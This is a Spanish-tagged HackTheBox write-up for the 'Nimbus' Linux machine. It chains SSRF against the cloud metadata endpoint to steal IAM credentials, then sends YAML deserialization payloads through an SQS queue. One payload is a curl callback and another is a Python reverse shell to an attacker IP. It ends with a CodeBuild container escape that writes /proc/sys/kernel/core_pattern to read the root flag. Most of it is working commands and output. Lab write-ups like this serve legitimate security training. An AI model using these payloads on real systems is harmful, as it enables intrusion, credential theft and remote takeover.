@@ -1,0 +1,324 @@
+---
+title: Nimbus
+description: Máquina Linux de dificultad dificil
+tags: [hackthebox, linux]
+draft: true
+lang: es
+parent: writeups/hackthebox/machines
+featured: true
+image: ../../../../../images/writeups/hackthebox/nimbus/nimbus.png
+difficulty: hard
+platform: htb
+os: linux
+hints: []
+translationId: nimbus
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/nimbus/nimbus.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/Nimbus](https://app.hackthebox.com/machines/nimbus)
+
+</div>
+
+## Enumeration
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/Nimbus 10.129.17.108
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openPorts 10.129.17.108
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
+|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nimbus.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Agregar `nimbus.htb` al archivo `/etc/hosts`
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://nimbus.htb/FUZZ -ic -c -t 100
+```
+
+```plaintext
+jobs                    [Status: 200, Size: 3453, Words: 432, Lines: 63, Duration: 171ms]
+login                   [Status: 200, Size: 876, Words: 56, Lines: 9, Duration: 941ms]
+```
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://nimbus.htb -H 'Host: FUZZ.nimbus.htb' -ic -c -t 100 -fs 178
+```
+
+```plaintext
+aws                     [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 165ms]
+```
+
+Agregar `aws.nimbus.htb` al archivo `/etc/hosts`
+
+<div style="display: flex; justify-content: center;">
+
+![Job submitted](@images/writeups/hackthebox/nimbus/nimbus-job-submitted.png)
+
+</div>
+
+url=http://2852039166/latest/meta-data/?x=.yaml
+
+<div style="display: flex; justify-content: center;">
+
+![SSRF listing](@images/writeups/hackthebox/nimbus/nimbus-ssrf-listing.png)
+
+</div>
+
+url=http://2852039166/latest/meta-data/iam/?x=.yaml
+
+<div style="display: flex; justify-content: center;">
+
+![SSRF iam](@images/writeups/hackthebox/nimbus/nimbus-ssrf-iam.png)
+
+</div>
+
+url=http://2852039166/latest/meta-data/iam/info/?x=.yaml
+
+<div style="display: flex; justify-content: center;">
+
+![SSRF info](@images/writeups/hackthebox/nimbus/nimbus-ssrf-info.png)
+
+</div>
+
+url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml
+
+<div style="display: flex; justify-content: center;">
+
+![SSRF role](@images/writeups/hackthebox/nimbus/nimbus-ssrf-role.png)
+
+</div>
+
+url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml
+
+<div style="display: flex; justify-content: center;">
+
+![SSRF role](@images/writeups/hackthebox/nimbus/nimbus-ssrf-role.png)
+
+</div>
+
+url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=.yaml
+
+<div style="display: flex; justify-content: center;">
+
+![SSRF tmp creds](@images/writeups/hackthebox/nimbus/nimbus-ssrf-tmp-creds.png)
+
+</div>
+
+```json
+{
+  "Code": "Success",
+  "LastUpdated": "2026-06-20T23:01:43Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
+  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
+  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
+  "Expiration": "2026-06-21T05:01:43Z"
+}
+```
+
+```bash
+export AWS_ACCESS_KEY_ID=ASIAQX4PG7L2K9M3N5R8
+export AWS_SECRET_ACCESS_KEY=bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
+export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM
+
+aws --endpoint-url http://aws.nimbus.htb --region us-east-1 sts get-caller-identity
+```
+
+```json
+{
+  "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
+  "Account": "847219365028",
+  "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
+}
+```
+
+```bash
+aws --endpoint-url http://aws.nimbus.htb --region us-east-1 sqs list-queues
+```
+
+```json
+{
+  "QueueUrls": ["http://floci:4566/847219365028/nimbus-jobs"]
+}
+```
+
+```bash
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```bash
+aws --endpoint-url http://aws.nimbus.htb --region us-east-1 sqs send-message \
+  --queue-url http://floci:4566/847219365028/nimbus-jobs \
+  --message-body '!!python/object/apply:os.system ["curl http://10.10.14.59:8000/pwned7"]'
+{
+    "MD5OfMessageBody": "1516df3804cc86080dbf3dbca3328374",
+    "MessageId": "ff498ea2-1a18-4d64-a482-fd7affb0f5fd"
+}
+```
+
+```bash
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.17.108 - - [20/Jun/2026 21:45:52] code 404, message File not found
+10.129.17.108 - - [20/Jun/2026 21:45:52] "GET /pwned7 HTTP/1.1" 404 -
+```
+
+```bash
+nc -lvnp 4444
+```
+
+```bash
+cat > job_revshell.yaml << 'EOF'
+!!python/object/apply:os.system ["python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('10.10.14.59',4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')\""]
+EOF
+```
+
+```bash
+aws --endpoint-url http://aws.nimbus.htb --region us-east-1 sqs send-message \
+  --queue-url http://floci:4566/847219365028/nimbus-jobs \
+  --message-body file://job_revshell.yaml
+```
+
+```bash
+nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.17.108 50060
+$ id
+id
+uid=1000(worker) gid=1000(worker) groups=1000(worker)
+```
+
+```bash
+worker@62918b51067f:/app$ ls -R /home/
+/home/:
+worker
+
+/home/worker:
+user.txt
+worker@62918b51067f:/app$ cat /home/worker/user.txt
+08e4c0b7a95f5addf897d84516901359
+```
+
+```bash
+worker@62918b51067f:/app$ env
+SHELL=bash
+PYTHON_SHA256=272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625
+HOSTNAME=62918b51067f
+PYTHON_VERSION=3.11.15
+AWS_DEFAULT_REGION=us-east-1
+PWD=/app
+HOME=/home/worker
+LANG=C.UTF-8
+LS_COLORS=
+GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
+AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
+QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
+TERM=xterm
+SHLVL=1
+AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
+AWS_ENDPOINT_URL=http://aws.nimbus.htb
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+_=/usr/bin/env
+```
+
+```bash
+curl -s http://172.18.0.2:4566/
+<?xml version="1.0" encoding="UTF-8"?><ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Owner><ID>owner</ID><DisplayName>owner</DisplayName></Owner><Buckets><Bucket><Name>nimbus-dev-artifacts</Name><CreationDate>2026-06-20T19:03:54.858890345Z</CreationDate></Bucket></Buckets></ListAllMyBucketsResult>
+
+curl -s http://172.18.0.2:4566/_localstack/health
+{"edition":"community","services":{"ssm":"running","sqs":"running","s3":"running","dynamodb":"running","sns":"running","lambda":"running","apigateway":"running","iam":"running","kafka":"running","elasticache":"running","rds":"running","neptune":"running","events":"running","scheduler":"running","logs":"running","monitoring":"running","secretsmanager":"running","apigatewayv2":"running","kinesis":"running","kms":"running","cognito-idp":"running","states":"running","cloudformation":"running","acm":"running","athena":"running","glue":"running","firehose":"running","email":"running","es":"running","ec2":"running","ecs":"running","appconfig":"running","appconfigdata":"running","ecr":"running","tagging":"running","bedrock-runtime":"running","eks":"running","pipes":"running","elasticloadbalancing":"running","codebuild":"running","codedeploy":"running","autoscaling":"running","backup":"running","transfer":"running","route53":"running","textract":"running","pricing":"running","transcribe":"running","ce":"running","cur":"running","bcm-data-exports":"running"},"version":"1.5.17","original_edition":"floci-always-free"}
+```
+
+```bash
+cat > /tmp/exploit.py << 'EOF'
+import boto3
+import time
+
+client = boto3.client(
+    'codebuild',
+    endpoint_url='http://floci:4566',
+    region_name='us-east-1',
+    aws_access_key_id='test',
+    aws_secret_access_key='test'
+)
+
+project_name = 'root_final_escape'
+
+buildspec_content = """version: 0.2
+phases:
+  build:
+    commands:
+      - UDIR=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /proc/self/mountinfo | head -1)
+      - printf '#!/bin/sh\\ncat /root/root.txt > /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/fs/tmp/rootflag.txt\\nchmod 777 /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/fs/tmp/rootflag.txt\\n' > /exploit_root.sh
+      - chmod +x /exploit_root.sh
+      - echo "|$UDIR/exploit_root.sh" > /proc/sys/kernel/core_pattern
+      - ulimit -c unlimited
+      - bash -c 'kill -11 $$'
+"""
+
+try:
+    client.delete_project(name=project_name)
+except:
+    pass
+
+client.create_project(
+    name=project_name,
+    source={'type': 'NO_SOURCE', 'buildspec': buildspec_content},
+    artifacts={'type': 'NO_ARTIFACTS'},
+    environment={
+        'type': 'LINUX_CONTAINER',
+        'image': 'floci/floci:latest',
+        'computeType': 'BUILD_GENERAL1_SMALL',
+        'privilegedMode': True,
+        'environmentVariables': [
+            {
+                'name': 'BASH_FUNC_id%%',
+                'value': '() { echo uid=1000; }',
+                'type': 'PLAINTEXT'
+            }
+        ]
+    },
+    serviceRole='arn:aws:iam::847219365028:role/service-role/codebuild-mock'
+)
+
+response = client.start_build(projectName=project_name)
+build_id = response['build']['id']
+
+time.sleep(10)
+EOF
+```
+
+```bash
+python3 /tmp/exploit.py
+```
+
+```bash
+cat /tmp/rootflag.txt
+f905c1dab924ee5575fa65c1a8344994
+```
